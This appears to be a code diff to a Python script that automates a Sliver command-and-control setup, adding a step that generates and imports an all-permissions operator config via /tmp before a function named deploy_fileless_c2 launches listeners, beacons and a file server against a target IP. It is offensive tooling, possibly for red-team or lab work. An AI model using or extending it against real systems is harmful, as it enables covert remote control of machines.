@@ -33,6 +33,26 @@ def ensure_sliver_daemon():
     else:
         print("[+] Sliver daemon is active.")
 
+def ensure_sliver_client_configured():
+    """Verify that sliver-client has at least one operator configuration imported.
+    If not, generates a local admin config and imports it.
+    """
+    client_config_dir = os.path.expanduser("~/.sliver-client/configs")
+    has_configs = False
+    if os.path.exists(client_config_dir):
+        if any(f.endswith(".cfg") for f in os.listdir(client_config_dir)):
+            has_configs = True
+            
+    if not has_configs:
+        print("[*] No Sliver client configuration found. Generating and importing local admin configuration...")
+        gen_cmd = ["sliver-server", "operator", "--name", "admin", "--lhost", "127.0.0.1", "--permissions", "all", "--save", "/tmp/admin.cfg"]
+        subprocess.run(gen_cmd, capture_output=True, text=True)
+        import_cmd = ["sliver-client", "import", "/tmp/admin.cfg"]
+        subprocess.run(import_cmd, capture_output=True, text=True)
+        print("[+] Sliver client successfully configured with local operator config.")
+    else:
+        print("[+] Sliver client configuration is active.")
+
 def ensure_sliver_listener():
     """Verify that the HTTP C2 listener on port 8080 is active.
     If not active, starts the listener via sliver-client.
@@ -215,6 +235,7 @@ def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
     # 0. Check and satisfy all C2 server prerequisites
     print("[*] Checking C2 orchestration prerequisites...")
     ensure_sliver_daemon()
+    ensure_sliver_client_configured()
     ensure_sliver_listener()
     ensure_beacon_compiled(kali_ip)
     ensure_file_server()
